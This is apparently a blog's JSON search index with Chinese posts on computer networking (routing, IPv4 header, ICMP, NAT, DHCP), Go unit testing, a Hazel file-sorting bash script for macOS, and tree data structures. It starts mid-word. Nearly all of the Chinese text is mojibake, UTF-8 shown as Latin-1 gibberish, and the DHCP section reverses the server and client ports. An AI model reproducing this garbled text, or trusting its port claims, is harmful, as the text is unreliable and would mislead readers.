ä¸ä¸€æ ·å°±ä¸åœ¨ä¸€ä¸ªç½‘ç»œ, è¦å‘ç»™é»˜è®¤ç½‘å…³\n\né»˜è®¤ç½‘å…³: æŒ‡å®šçš„è½¬å‘è·¯ç”±å™¨çš„ IP åœ°å€\n\nåˆ°è¾¾è·¯ç”±å™¨æ—¶, æ£€æŸ¥è·¯ç”±æ¡ç›®, åŒ¹é…åˆ°æ­£ç¡®çš„ç½‘ç»œåœ°å€åè½¬å‘\n\nè·¯ç”±å™¨ä¸è½¬å‘å¹¿æ’­åœ°å€\n\n\n\n### 7.1 è·¯ç”±è¡¨\n\né»˜è®¤è·¯ç”± 0.0.0.0/0, \t\t\t\t ç½‘ç»œå‰ç¼€æœ€çŸ­,æœ€æ¨¡ç³Š, é€‰æ‹©ä¼˜å…ˆçº§æœ€ä½\n\nç‰¹å®šè·¯ç”± 198.168.1.2/32        ç½‘ç»œå‰ç¼€æœ€é•¿,æœ€å…·ä½“, é€‰æ‹©ä¼˜å…ˆçº§æœ€é«˜\n\n\n\nå› ä¸ºæœ‰é»˜è®¤è·¯ç”±çš„å­˜åœ¨(å°‘äº†è·¯ç”±æ¡ç›®å‘ç»™é»˜è®¤è·¯ç”±, ä¸å­˜åœ¨çš„ç½‘ç»œä¹Ÿç»™é»˜è®¤è·¯ç”±), å®¹æ˜“å‘ç”Ÿè·¯ç”±ç¯è·¯çš„é—®é¢˜, æ‰€ä»¥ IP æ•°æ®æŠ¥æœ‰ TTL , å˜æˆ0äº†å°±ä¸¢å¼ƒ\n\n\n\n### 7.2 è·¯ç”±é€‰æ‹©åè®®\n\nä¸€ä¸ªç½‘ç»œ,ç»„æˆè‡ªæ²»ç³»ç»Ÿ AS\n\nä¸¤ä¸ªAS ä¹‹é—´ç”¨å¤–éƒ¨ç½‘å…³åè®® EGP\n\nASå†…éƒ¨ç”¨å†…éƒ¨ç½‘å…³åè®® IGP\n\n![1](è®¡ç®—æœºç½‘ç»œç®€æ˜æ•™ç¨‹/2.png)\n\n\n\n##### 7.2.1 RIP å†…éƒ¨ç½‘å…³,UDP\n\nç»è¿‡ä¸€ä¸ªè·¯ç”±+1, è®¤ä¸ºè¶ŠçŸ­çš„è·¯ç”±å°±æ˜¯å¥½çš„è·¯ç”±, è·³æ•°å¤§äº15,è¡¨æ˜ä¸å¯è¾¾\n\nå¦‚æœè·ç¦»ä¸€æ ·, å¯ä»¥è´Ÿè½½å‡è¡¡\n\n\n\nè·¯ç”±å™¨ä»…å’Œç›¸é‚»è·¯ç”±å™¨å‘¨æœŸäº¤æ¢è·¯ç”±ä¿¡æ¯\n\n![1](è®¡ç®—æœºç½‘ç»œç®€æ˜æ•™ç¨‹/3.png)\n\n\n\n##### 7.2.2 OSPF å†…éƒ¨ç½‘å…³,IP\n\nå…‹æœ RIP ç¼ºç‚¹,1989å¹´å¼€å‘å‡º\n\nè·¯ç”±å™¨ä¹‹é—´æœ‰ä»£ä»·, é‡‡ç”¨æœ€çŸ­è·¯å¾„ç®—æ³•(è¿ªæ°æ–¯ç‰¹æ‹‰)\n\n\n\n##### 7.2.3 BGP å¤–éƒ¨ç½‘å…³,tcp\n\nåªæ˜¯èƒ½æ‰¾åˆ°åˆ°è¾¾çš„æ¯”è¾ƒå¥½è·¯ç”±, ä¸æ˜¯æœ€ä½³è·¯ç”±\n\nä¸åŒçš„ ASè‡ªæ²»ç³»ç»Ÿå‘è¨€äººå»ºç«‹ tcp è¿æ¥,äº¤æµä¿¡æ¯\n\n\n\n# 8. ipv4é¦–éƒ¨æ ¼å¼\n\nå›ºå®š20å­—èŠ‚+ 40å­—èŠ‚å¯å˜éƒ¨åˆ†\n\n### 8.1 å›ºå®š20å­—èŠ‚\n\n+ ç‰ˆæœ¬4bit + é¦–éƒ¨é•¿åº¦(4å­—èŠ‚çš„æ•´æ•°å€) 4bit +åŒºåˆ†æœåŠ¡ 8bit + æ€»é•¿åº¦(é¦–éƒ¨+æ•°æ®) 16bit \n+  æ ‡è¯† æ ‡å¿— ç‰‡åç§»   ä¸‰ä¸ªç”¨äº ipæ•°æ®æŠ¥åˆ†ç‰‡\n+ ç”Ÿå­˜æ—¶é—´TTL(ä»¥è·³æ•°å¯¹å•ä½)åè®®8bit +   åè®®8bit(1 icmp 2 igmp 6tcp 17udp 41ipv6 89 ospf) + é¦–éƒ¨æ£€éªŒå’Œ16bit(æ£€æµ‹é¦–éƒ¨æ˜¯å¦å‡ºé”™, ipv6ä¸å†æ£€éªŒ)\n+ æº IPåœ°å€  32bit\n+ ç›®çš„ IPåœ°å€ 32bit\n\n\n\n### 8.2 IPæ•°æ®æŠ¥åˆ†ç‰‡\n\nä»¥å¤ªç½‘æ•°æ®è½½è·éƒ¨åˆ†æœ€å¤§1500å­—èŠ‚çš„é™åˆ¶(MTU), IPæ•°æ®æŠ¥å¤ªå¤§çš„è¯, éœ€è¦åˆ†ç‰‡å‘é€\n\n![1](è®¡ç®—æœºç½‘ç»œç®€æ˜æ•™ç¨‹/4.png)\n\n\n\n# 9. ICMPç½‘é™…æ§åˆ¶æŠ¥æ–‡åè®®\n\nå°è£…åœ¨ IP æ•°æ®æŠ¥ä¸­å‘é€, å‘æºç‚¹æŠ¥é”™  å’Œ å‘å…¶ä»–ä¸»æœºè¯¢é—®\n\n+ å·®é”™æŠ¥å‘ŠæŠ¥æ–‡\n  + ç»ˆç‚¹ä¸å¯æ‰“\n  + æºç‚¹æŠ‘åˆ¶\n  + æ—¶é—´è¶…è¿‡\n  + å‚æ•°é—®é¢˜\n  + æ”¹å˜è·¯ç”±\n\n+ è¯¢é—®æŠ¥æ–‡\n  + å›é€è¯·æ±‚å’Œå›ç­” \n    + ping å‘½ä»¤, ä¸é€šè¿‡ tcp å’Œ udp  \n    +  tracert å‘½ä»¤, ç”¨æ¥çœ‹ç»è¿‡å“ªäº›è·¯ç”±å™¨\n  + æ—¶é—´æˆ³è¯·æ±‚å’Œå›ç­”\n\n\n\n# 10. è™šæ‹Ÿä¸“ç”¨ç½‘vpnå’Œ ç½‘ç»œåœ°å€è½¬æ¢NAT\n\n### 10.1 ç§æœ‰åœ°å€\n\n+ 10.0.0.0/8\n+ 172.16.0.0/12\n+ 192.168.0.0/16\n\n### 10.2 ä¸åŒå±€åŸŸç½‘é—´çš„å‘é€\n\n+ è·¯ç”±å™¨ä¸è½¬å‘ç§æœ‰åœ°å€\n\n+ æ‰€ä»¥å¯¹å†…éƒ¨ IPæ•°æ®æŠ¥, è¿›è¡ŒåŠ å¯†, å†æ¬¡å¥—ä¸€ä¸ªé¦–éƒ¨, å†™ä¸Šå…¬ç½‘åœ°å€\n+ åˆå« IP éš§é“æŠ€æœ¯\n\n### 10.3 NAT\n\n+ è·¯ç”±å™¨ä¸Šå®‰è£… NAT è½¯ä»¶\n+ åˆ°è·¯ç”±å™¨çš„æ—¶å€™,è½¬æ¢å…¨çƒåœ°å€, è®°å½•åœ¨è·¯ç”±å™¨çš„ NATè½¬æ¢è¡¨é‡Œ\n+ NAPTè·¯ç”±å™¨, å°†ç«¯å£å·å’Œ IP åœ°å€ä¸€èµ·è½¬æ¢\n+ NAT, å¤–ç½‘ä¸èƒ½ä¸»åŠ¨å‘èµ·åˆ°å†…ç½‘çš„ä¸»æœº, å†…ç½‘ä¸»æœºä¸èƒ½å……å½“æœåŠ¡å™¨, å¦‚æœå¯ä»¥,å°±è¦ç‰¹æ®Šç©¿é€æŠ€æœ¯\n\n> # è¿è¾“å±‚\n\n# 11. è¿è¾“å±‚\n\n### 11.1 ç«¯å£å·  0-65535\n\n+ ç†ŸçŸ¥ç«¯å£å· 0-1023 ä¸ªäººä¸èƒ½ç”¨\n+ ç™»è®°ç«¯å£å· 1024-49151 ä¹Ÿå¾—IANAç™»è®°\n+ çŸ­æš‚ç«¯å£å· 49152-65535 \n\n### 11.2 å‘é€å¤ç”¨å’Œæ¥æ”¶åˆ†ç”¨\n\n![1](è®¡ç®—æœºç½‘ç»œç®€æ˜æ•™ç¨‹/5.png)\n\n\n\n> # æ•°æ®é“¾è·¯å±‚\n\n# 12. æ•°æ®é“¾è·¯å±‚\n\n#### 12.1 å°è£…æˆå¸§\n\næ·»åŠ å¸§å¤´, æ·»åŠ å¸§å°¾æ¥æ ‡å¿—\n\nå¦‚æœæ•°æ®é‡Œé¢æœ‰å¸§çš„å®šç•Œæ ‡å¿—, å°±å¯¹æ•°æ®è¿›è¡Œä¸€ä¸ªè½¬ä¹‰, å¦åˆ™ä¼šè®¤ä¸ºé”™è¯¯çš„ç»“æŸä½ç½®\n\nå¸§çš„æœ€å¤§æ•°æ®é•¿åº¦æœ‰é™åˆ¶, å«åš MTU\n\n#### 12.2 å·®é”™æ£€æµ‹\n\n![1](è®¡ç®—æœºç½‘ç»œç®€æ˜æ•™ç¨‹/6.png)\n\n\n\n+ å¥‡å¶æ ¡éªŒ\n  + åœ¨æ•°æ®åé¢æ·»åŠ 1ä½å¥‡å¶æ ¡éªŒä½, ä½¿1çš„ä¸ªæ•°ä¸ºå¥‡æ•°æˆ–å¶æ•°\n  + ä¸é è°±, ä¸€åŠçš„å¤±è¯¯ç‡\n\n+ CRC æ ¡éªŒ\n\n  ![1](è®¡ç®—æœºç½‘ç»œç®€æ˜æ•™ç¨‹/7.png)\n\n  ![1](è®¡ç®—æœºç½‘ç»œç®€æ˜æ•™ç¨‹/8.png)\n\n#### 12.3 å¯é ä¼ è¾“\n\n+ ä¸€èˆ¬é“¾è·¯å±‚åœ¨æœ‰çº¿ä»¥å¤ªç½‘ä¸å®ç°å¯é ä¼ è¾“, æ— çº¿å±€åŸŸç½‘ä¿¡å·å·®, å®ç°å¯é ä¼ è¾“\n\n+ åœæ­¢ç­‰å¾…åè®®SW\n\n  + ä¿¡é“åˆ©ç”¨ç‡ç‰¹åˆ«ä½\n\n    ![1](è®¡ç®—æœºç½‘ç»œç®€æ˜æ•™ç¨‹/9.png)\n\n\n+ å›é€€ N å¸§åè®®GBN \n\n  + é€šè¿‡å‘é€çª—å£å‘é€, ç´¯è®¡ç¡®è®¤å¢å¤§æ•ˆç‡\n  + ä½†æ˜¯å‘é€5ä¸ª, ç¬¬1ä¸ªå‡ºé”™, ä¼šè¿ç´¯å‰©ä¸‹çš„4ä¸ª, é€ æˆ5ä¸ªéƒ½éœ€è¦é‡ä¼ , å·®çš„æƒ…å†µä¸‹æ•ˆç‡ä¹Ÿä¸é«˜\n  + æ¥æ”¶çª—å£åªèƒ½æ˜¯1\n\n\n+ é€‰æ‹©é‡ä¼ åè®®SR\n\n  + æ¥æ”¶çª—å£å¤§äº1, æœ‰äº†ç¼“å­˜\n  + ä¸èƒ½ç´¯è®¡ç¡®è®¤,åªèƒ½é€ä¸€ç¡®è®¤\n\n\n\n# 13 æ•°æ®é“¾è·¯å±‚åè®®\n\n#### 13.1 ç‚¹å¯¹ç‚¹åè®® PPP\n\nä¸æä¾›å¯é ä¼ è¾“æœåŠ¡\n\n\n\n> # åº”ç”¨å±‚\n\n# 20. DHCP \n\ndhcp æœåŠ¡ç«¯å£udp 68,  å®¢æˆ·ç«¯ udp 67\n\ndhcp æœåŠ¡å™¨, ä¸€èˆ¬é›†æˆåœ¨è·¯ç”±å™¨é‡Œ\n\nå®¢æˆ·é€šè¿‡ dhcp å®¢æˆ·ç«¯å‘ dhcp æœåŠ¡å™¨è¯·æ±‚, å¾—åˆ° IPç§Ÿç”¨, æ—¶é—´è¿‡äº†ä¸€åŠå,é‡æ–°å‘é€ç§Ÿç”¨è¯·æ±‚\n\nåœ¨ä½¿ç”¨çš„æ—¶å€™éœ€è¦ç”¨ arp è¯·æ±‚ç¡®å®š ip æœªè¢«å ç”¨","tags":["ç½‘ç»œ"],"categories":["ç½‘ç»œ"]},{"title":"golangæµ‹è¯•å•ä¸ªæ–‡ä»¶æˆ–å‡½æ•°","url":"%2Fp%2F401250d7.html","content":"\n### 1. æµ‹è¯•å•ä¸ªæ–‡ä»¶æˆ–å‡½æ•°\n\næµ‹è¯•ä¸€ä¸ªæ–‡ä»¶\n\n```bash\ngo test -v hello_test.go\n```\n\n\n\næµ‹è¯•ä¸€ä¸ªå‡½æ•°\n\n```bash\ngo test -v  -test.run=\"TestA\"  \n```\n\n<!-- more -->\n\næ³¨æ„åœ¨æµ‹è¯•å•ä¸ªæ–‡ä»¶æ—¶, ä¼šå‡ºç°æœªå®šä¹‰çš„æƒ…å†µ, è¿™æ˜¯å› ä¸ºå®šä¹‰åœ¨å…¶ä»–æ–‡ä»¶é‡Œ, éœ€è¦åŠ ä¸Šå®šä¹‰çš„æ–‡ä»¶.\n\n```bash\ngo test -v hello.go hello_test.go\n```\n\n\n\nè€Œæµ‹è¯•å•ä¸ªå‡½æ•°ä¸å­˜åœ¨è¿™ä¸ªé—®é¢˜, å¯ä»¥åœ¨ä¸€ä¸ªæ–‡ä»¶å†…ç”¨ç›¸åŒçš„å‰ç¼€å‘½åæµ‹è¯•å‡½æ•°, ç„¶åç”¨æ­£åˆ™è¡¨è¾¾å¼å»æµ‹è¯•.\n\nå¦‚:\n\n```bash\ngo test -v  -test.run=\"TestA*\"  \n```\n\n\n\n### 2. æµ‹è¯•è¦†ç›–ç‡\n\n```bash\ngo test -v -coverprofile=a.out -test.run=\"TestA*\" # æŠŠæµ‹è¯•ç»“æœä¿å­˜åœ¨ a.out\n\ngo tool cover -html=./a.out  # é€šè¿‡æµè§ˆå™¨æ‰“å¼€, å¯ä»¥çœ‹åˆ°è¦†ç›–ç»è¿‡çš„å‡½æ•°\n```\n\n\n\n### 3. æ€»ç»“\n\nä¸å†™å•å…ƒæµ‹è¯•çš„ä»£ç éƒ½æ˜¯è€æµæ°“.","tags":["golang"],"categories":["4_golangå®æˆ˜"]},{"title":"hazelæ•´ç†ç¥å™¨","url":"%2Fp%2F1d0d22af.html","content":"\nhazel æ˜¯ä¸€æ¬¾å¯ä»¥è‡ªåŠ¨ç›‘æ§å¹¶æ•´ç†æ–‡ä»¶å¤¹çš„å·¥å…·ï¼Œå…¶å®˜ç½‘çš„ä»‹ç»å°±æ˜¯ç®€å•çš„ä¸€å¥è¯ï¼šAutomated Organization for Your Macã€‚\n\nå®ƒçš„ä½¿ç”¨æœ‰ç‚¹ç±»ä¼¼äºç½‘ç»œæœåŠ¡ IFTTTï¼Œä½ å¯ä»¥è®¾å®šä¸€ä¸ª if æ¡ä»¶ï¼Œå¦‚æœè¢«ç›‘æ§çš„æ–‡ä»¶å¤¹å‡ºç°ç¬¦åˆæ¡ä»¶çš„é¡¹ï¼Œé‚£ä¹ˆå¯¹å…¶æ‰§è¡Œ then çš„æ“ä½œï¼ˆä¹Ÿå¯ä»¥é€šè¿‡é‚®ç®±çš„æ”¶ä»¶è¿‡æ»¤è§„åˆ™æ¥ç†è§£ï¼‰ã€‚\n\n<!-- more -->\n\n# 1. hazel\n\nhazelèƒ½åšä»€ä¹ˆå‘¢ï¼Ÿ\n\nä¾‹å¦‚å¯ä»¥æ ¹æ®æ–‡ä»¶åˆ›å»ºçš„æ—¶é—´ï¼Œè‡ªåŠ¨å°†æ–‡ä»¶è¿›è¡Œé¢œè‰²æ ‡è®°ã€‚è‡ªåŠ¨çš„ç”¨ç‰¹å®šè½¯ä»¶æ‰“å¼€æŸä¸ªç‰¹å®šæ–‡ä»¶ã€æ ¹æ®æ–‡ä»¶çš„ç±»å‹è‡ªåŠ¨è½¬ç§»åˆ°ç›¸åº”çš„æ–‡ä»¶å¤¹ä¸­ã€è‡ªåŠ¨å¸®ä½ æ•´ç†ç…§ç‰‡å¯ä»¥æŒ‰ç…§ã€Œå¹´-æœˆã€æ¥åˆ†ç±»å­˜å‚¨åˆ°ç›¸åº”æ–‡ä»¶å¤¹ã€è‡ªåŠ¨æŠŠæ–‡ä»¶å¤¹ä¸­çš„å†…å®¹ä¸Šä¼ åˆ° FTP ç­‰ç½‘ç»œæœåŠ¡ä¸­ç­‰ç­‰ã€‚ã€‚\n\nå†åŠ ä¸Šhazel æ”¯æŒ AppleScriptã€JavaScriptã€Automator workflow ç­‰ä»£ç æŒ‡ä»¤ï¼Œä»¤å…¶æ‰©å±•æ€§æ›´ä¸Šä¸€å±‚æ¥¼ï¼Œå¯ä»¥åšåˆ°çš„äº‹æƒ…ä¹Ÿå¯ä»¥è¯´åªå‰©ä¸‹æƒ³è±¡åŠ›è¿™é“é—¨æ§›äº†ã€‚\n\n### 1.1 ç•Œé¢\n\nå·¦è¾¹æ˜¯ç›‘æ§çš„æ–‡ä»¶å¤¹ï¼Œä¸­é—´æ˜¯è§„åˆ™åˆ—è¡¨ï¼Œå³è¾¹æ˜¯è§„åˆ™çš„è®¾ç½®ã€‚\n\n<img src=\"hazel%E6%95%B4%E7%90%86%E7%A5%9E%E5%99%A8/image-20220505101952417.png\" alt=\"image-20220505101952417\" style=\"zoom:47%;\" />\n\næ­¤æ—¶è®¾ç½®çš„æ˜¯æ–‡ä»¶æ·»åŠ æ—¶é—´åœ¨æœ€ååŒ¹é…æ—¶é—´ä¹‹å‰ï¼ˆæ–°æ–‡ä»¶æ·»åŠ åæš‚æœªè¢«åŒ¹é…ï¼Œæ‰€ä»¥ä¸€å®šæ˜¯æ—©äºåŒ¹é…æ—¶é—´ï¼‰ï¼Œå°±æ˜¯æ–°å¢åŠ æ–‡ä»¶è®¾ç½®è“è‰²æ ‡ç­¾ã€‚\n\n### 1.2 æ¡ä»¶çš„åµŒå¥—ä½¿ç”¨\n\nå›¾ä¸­ä½¿ç”¨äº†åµŒå¥—æ¡ä»¶ï¼Œå…·ä½“çš„æ“ä½œæ˜¯é¼ æ ‡é•¿æŒ‰å³ä¾§åŠ å·ï¼ˆä¹Ÿå¯æŒ‰ä½ Option åç‚¹å‡»ï¼‰ï¼Œå³å¯å¢åŠ åµŒå¥—æ¡ä»¶ç»„ã€‚\n\nå¯ä»¥çœ‹åˆ°ä¸‹å›¾æœ‰ 3ä¸ªifï¼Œåƒå†™ä»£ç ä¸€æ ·ã€‚\n\n<img src=\"hazel%E6%95%B4%E7%90%86%E7%A5%9E%E5%99%A8/image-20220505102832037.png\" alt=\"image-20220505102832037\" style=\"zoom: 50%;\" />\n\n### 1.3 æŸ¥çœ‹log\n\nåœ¨åšæ‰€æœ‰æ“ä½œçš„æ—¶å€™ï¼Œå¯ä»¥ç‚¹å‡» Help->View Logs çœ‹æ‰§è¡Œæ­¥éª¤ã€‚\n\n\n\n# 2. åœºæ™¯ä½¿ç”¨\n\n### 2.1 é€‰æ‹©æ ‡ç­¾æ¥ä¸‹å‘æŒ‡ä»¤\n\næ·»åŠ Tagsæ–¹å¼ä¸€å®šè¦ä½¿ç”¨å¿«æ·é”®æ‰èƒ½å®Œæˆï¼Œæˆ‘ä¸ªäººæŠŠåŠ Tagsçš„å¿«æ·è®¾ç½®ä¸ºï¼šcommand+e\n\nå…³äºç»™æ ‡ç­¾åŠ å¿«æ·é”®çš„æ–¹æ³•ï¼Œè¯·å‚è€ƒï¼šhttps://medium.com/innovation-design/how-to-add-a-shortcut-for-finder-tags-on-macos-mojave-65d1502ffd98\n\n<img src=\"hazel%E6%95%B4%E7%90%86%E7%A5%9E%E5%99%A8/image-20220505110632784.png\" alt=\"image-20220505110632784\" style=\"zoom:50%;\" />\n\né€šè¿‡é€‰æ‹©æ ‡ç­¾ä¸‹å‘æŒ‡ä»¤è¿˜æœ‰ä¸ªæœ€å¤§ä¼˜åŠ¿æ˜¯ï¼šåŒæ—¶æ“ä½œå¤šä¸ªæ–‡ä»¶ã€‚ä¸€æ¬¡æ€§ä¸ºå¤šä¸ªä¸åŒç±»å‹æ–‡ä»¶ä¸‹è¾¾æŒ‡ä»¤åï¼Œæ‰€æœ‰æ–‡ä»¶ä¾¿èƒ½è‡ªå·±æ‰¾åˆ°æ–¹å‘å„å½’å…¶æ‰€ã€‚\n\n\n\n### 2.2 æ ‡ç­¾è§„åˆ™\n\n<img src=\"hazel%E6%95%B4%E7%90%86%E7%A5%9E%E5%99%A8/image-20220505114307967.png\" alt=\"image-20220505114307967\" style=\"zoom:40%;\" />\n\nå¦‚ä¸Šå›¾ï¼Œæˆ‘ä»¬æŠŠè§¦å‘æ¡ä»¶è®¾ç½®æˆåªè¦Tagsé‡ŒåŒ…å«Dropbox ä¾¿ä¼šè§¦å‘ä¸‹é¢çš„æ‰§è¡Œæ­¥éª¤ã€‚\n\n1. ç³»ç»Ÿä¼šrun shell scriptï¼Œè¿™ä¸ªè„šæœ¬çš„ä½œç”¨ä½¿æŠŠæ–‡ä»¶å½’ç±»åˆ°å®ƒçš„â€œå¤§æœ¬è¥â€ã€‚\n2. ç§»é™¤ Tag Dropbox ï¼Œç›®çš„æ˜¯é¿å…Hazelæ¡ä»¶äºŒæ¬¡è§¦å‘ã€‚\n3. è§„åˆ™æ–‡ä»¶ï¼ŒæŠŠ_root æ¢æˆè‡ªå·±çš„æ–‡ä»¶å¤¹ã€‚\n\n```bash\n_root=~/Dropbox/3_SORT/\n_sortIntoSubfolderByKind=1\n\nsmartMv(){\nif [ -z \"$1\" ]\n  then\n    echo \"No argument supplied\"\n    exit\nfi\n\n\n# Variable definitions start\nfile=$1 # file path\n_root=$2 # root directory\nsortByKind=$3 # if needed sort by kind in Folders\nfileName=$(basename -- \"$file\")\npwd=$(pwd)\n# Variable definitions ended\n\n# function defined\nmv_no_override() {\n    local dir file ext base num\n    if [ -d \"$2\" ]; then\n        dir=$2\n        file=$(basename \"$1\")\n    else\n        dir=$(dirname \"$2\")\n        file=$(basename \"$2\")\n    fi\n    ext=\"$(sed -r 's/.+(\\..+)|.*/\\1/' <<<\"$file\")\"\n    base=\"$(sed -r 's/(.+)\\..+|(.*)/\\1\\2/' <<<\"$file\")\"\n    while [ -e \"$dir/$base$num$ext\" ]; do\n        (( num++ ))\n    done\n    mv \"$1\" \"$dir/$base$num$ext\"\n    echo \"move file $pwd/$1 ->\" \"$dir/$base$num$ext\" \"success\"\n}\n\n\nmoveTO(){\n  if [ ! -d \"$2\" ];then # if folder exist\n    mkdir -p \"$2\"\n  fi\n  mv_no_override \"$1\" \"$2/${3}\"\n\n}\nmdlsFormat(){ # format result for `mdls`\n  echo `mdls -name $1 $2 | cut -d \"=\" -f 2 | sed 's/\\\"//g' | sed -e 's/^[[:space:]]*//'`\n}\nmdlsFormatUTI(){\n  echo `mdls -name $1 $2 | cut -d \"=\" -f 2 | sed 's/,//' | sed 's/)//' | sed 's/(//'`\n}\n# function defined ended\n\n\n# Classification according to utiTree start\nutiTree=(`mdlsFormatUTI kMDItemContentTypeTree $file`)\nfor uti in $utiTree\ndo\n  _uti=`echo $uti | sed 's/\\\"//g'`\n\n  case $_uti in\n    public.source-code)\n    _basePath=${_root}Source-code/\n    break\n    ;;\n    public.composite-content)\n    _basePath=${_root}Documents/\n    break\n    ;;\n    public.presentation)\n    _basePath=${_root}Presentations/\n    break\n    ;;\n    public.disk-image)\n    _basePath=${_root}Disk-images/\n    break\n    ;;\n    public.archive)\n    _basePath=${_root}Archives/\n    break\n    ;;\n    public.movie)\n      _basePath=${_root}Videos/\n      break\n    ;;\n    public.audio)\n      _basePath=${_root}Audios/\n      break\n    ;;\n    public.image)\n      _basePath=${_root}Pictures/\n      break\n    ;;\n    public.plain-text)\n     _basePath=${_root}Documents/\n     break\n    ;;\n    public.folder)\n    _basePath=${_root}Folders/\n    break\n    ;;\n    *)\n    echo other \"$_uti\"\n    _basePath=${_root}Others/\n    ;;\n  esac\ndone\n# Classification according to utiTree ended\n\n# fix basePath by extension\nextension=\"${fileName##*.}\"\necho extension \"$extension\"\ncase $extension in\n  docx|xlsx)\n    _basePath=${_root}Documents/\n    ;;\n  pptx|ppt|key)\n    _basePath=${_root}Presentations/\n    ;;\n  archiver|7z|rar|gz)\n    _basePath=${_root}Archives/\n    ;;\nesac\n\n# rename start\nkMDItemContentCreationDate=$(mdlsFormat kMDItemContentCreationDate \"$file\")\n\nregexp=\"(^[0-9]{4}\\-[0-9]{2}\\-)\" # check file name\nif [[ $fileName =~ $regexp ]]\n  then\n    echo \"file name has date, don't rename\"\n  else\n    creationDatesFormat=$(date -j -f \" %Y-%m-%d %H:%M:%S %z\" \"$kMDItemContentCreationDate\" +%Y-%m-)\n    fileName=${creationDatesFormat}$fileName # rename file by adding creationTime\nfi\n# rename end\n\n# mv to folder start\nif [[ $sortByKind == 1 ]]\nthen\n  kind=$(mdlsFormat kMDItemKind \"$file\")\n  destination=${_basePath}${kind}\n  moveTO \"$file\" \"${destination}\" \"${fileName}\" # sort to finder by kind\nelse\n  moveTO \"$file\" \"$_basePath\" \"${fileName}\" # move to basePath\nfi\n\n# mv to folder end\n\n}\n\nsmartMv \"$1\" \"$_root\" $_sortIntoSubfolderByKind\n```\n\n\n\nè§£é‡Šï¼š\n\n```bash\n# è·å–ç±»å‹\nmdls -name kMDItemContentTypeTree ~/test.txt | cut -d \"=\" -f 2 | sed 's/,//' | sed 's/)//' | sed 's/(//'\n\"public.item\"\n\"public.text\"\n\"public.data\"\n\"public.content\"\n\"public.plain-text\"\n\n\n# è·å–æ—¥æœŸ\nmdls -name kMDItemContentCreationDate ~/test.txt | cut -d \"=\" -f 2 | sed 's/\\\"//g' | sed -e 's/^[[:space:]]*//'\n2021-11-09 15:53:04 +0000\n\n# è·å–ç±»å‹\nmdls -name kMDItemKind ~/test.txt | cut -d \"=\" -f 2 | sed 's/\\\"//g' | sed -e 's/^[[:space:]]*//'\nçº¯æ–‡æœ¬æ–‡ç¨¿\n\n# è·å–æ–‡ä»¶å\nmdls -name kMDItemFSName ~/test.txt | cut -d \"=\" -f 2 | sed 's/\\\"//g' | sed -e 's/^[[:space:]]*//'\ntest.txt\n```\n\n\n\n# 3. å®ç”¨æ“ä½œ\n\n### 3.1 é€’å½’è¿›å…¥æ–‡ä»¶å¤¹æ‰§è¡Œæ“ä½œ\n\n<img src=\"hazelæ•´ç†ç¥å™¨/1.png\" alt=\"1\" style=\"zoom: 40%;\" />\n\n<img src=\"hazelæ•´ç†ç¥å™¨/2.png\" alt=\"2\" style=\"zoom:40%;\" />\n\n### 3.2  è‡ªåŠ¨æ—¥æœŸå½’ç±»åˆ°å­æ–‡ä»¶å¤¹\n\næ–‡ä»¶å¤¹é¡ºåºï¼šæ‰©å±• +  å¹´ + æœˆ \n\næ³¨æ„ï¼Œä¸¤ä¸ª`date modified` ä¿®æ”¹ä¸ºç‰¹å®šçš„å¹´æˆ–æœˆã€‚ä¸­é—´åŠ ä¸ªå³ä¸‰è§’ç¬¦å·ï¼Œæ˜¯å­æ–‡ä»¶å¤¹çš„æ„æ€ã€‚\n\n<img src=\"hazelæ•´ç†ç¥å™¨/3.png\" alt=\"3\" style=\"zoom:40%;\" />\n\n\n\n# 4. å‚è€ƒèµ„æ–™\n\n+ https://sspai.com/post/35212\n+ https://eurychen.me/post/solutions-of-macos-file-management/","tags":["mac"],"categories":["è½¯ä»¶"]},{"title":"æ ‘çš„ä»‹ç»å’Œåˆ†ç±»","url":"%2Fp%2Fd354593e.html","content":"\n# 1. æ ‘\n\nåœ¨è‡ªç„¶ç•Œå’Œæ—¥å¸¸ç”Ÿæ´»ä¸­ï¼Œå¯ä»¥è§åˆ°å¾ˆå¤šæƒ…å½¢å¯ä»¥å½’ç»“ä¸ºæ ‘ç»“æ„ã€‚å¦‚ï¼šå®¶æ—è°±ç³»ã€è¡Œæ”¿ç®¡ç†æœºæ„ã€Windowsç£ç›˜æ–‡ä»¶ç®¡ç†ç³»ç»Ÿç­‰ã€‚\n\nè‡ªç„¶ç•Œçš„æ ‘æ˜¯æ ‘æ ¹æœä¸‹ï¼Œæå¹²å’Œå¶å­å‘ä¸Šç”Ÿé•¿ï¼Œè€Œæˆ‘ä»¬è®¨è®ºçš„æ ‘åœ¨ç”Ÿé•¿æ–¹å‘ä¸Šæ­£å¥½ä¸å…¶ç›¸åï¼Œå®ƒæ˜¯å€’é•¿çš„æ ‘ï¼Œå³æ ¹æœä¸Šï¼Œæå¹²å’Œå¶å­æœä¸‹ã€‚\n\n<!-- more -->\n\n### 1.1 å®šä¹‰\n\næ ‘ï¼ˆTreeï¼‰æ˜¯nï¼ˆnâ‰¥0ï¼‰ä¸ªç»“ç‚¹çš„æœ‰é™é›†åˆã€‚å®ƒæ»¡è¶³ï¼š\nï¼ˆ1ï¼‰ä»…æœ‰ä¸€ä¸ªç‰¹å®šçš„ç»“ç‚¹ï¼Œç§°ä¸ºæ ¹ï¼ˆrootï¼‰ç»“ç‚¹;\nï¼ˆ2ï¼‰å…¶ä½™ç»“ç‚¹åˆ†ä¸ºm(mâ‰¥0)ä¸ªäº’ä¸ç›¸äº¤çš„éç©ºæœ‰é™é›†åˆ   å…¶ä¸­æ¯ä¸ªé›†åˆè‡ªèº«åˆæ˜¯ä¸€æ£µæ ‘ï¼Œç§°ä¸ºæ ¹çš„å­æ ‘ï¼ˆsubtreeï¼‰ã€‚\n\næœ¬æ¡å³æ˜¯è¯´ï¼Œæ ‘ç»“ç‚¹ä¹‹é—´çš„è·¯å¾„ä¸èƒ½å½¢æˆå›è·¯ï¼Œå¦åˆ™ç§°ä¸ºå›¾\n\n+ ä¸ºäº†è¡¨è¿°æ–¹ä¾¿ï¼ŒæŠŠæ²¡æœ‰ç»“ç‚¹çš„æ ‘ç§°ä¸ºç©ºæ ‘ã€‚\n+ æ ‘çš„å®šä¹‰å…·æœ‰é€’å½’æ€§ï¼šå³ä¸€æ£µæ ‘æ˜¯ç”±æ ¹åŠè‹¥å¹²æ£µå­æ ‘æ„æˆçš„ï¼Œè€Œå­æ ‘åˆæ˜¯ç”±æ ¹åŠè‹¥å¹²æ£µå­æ ‘æ„æˆçš„ã€‚\n\n### 1.2 æ ‘çš„åŸºæœ¬æœ¯è¯­\n\n+ 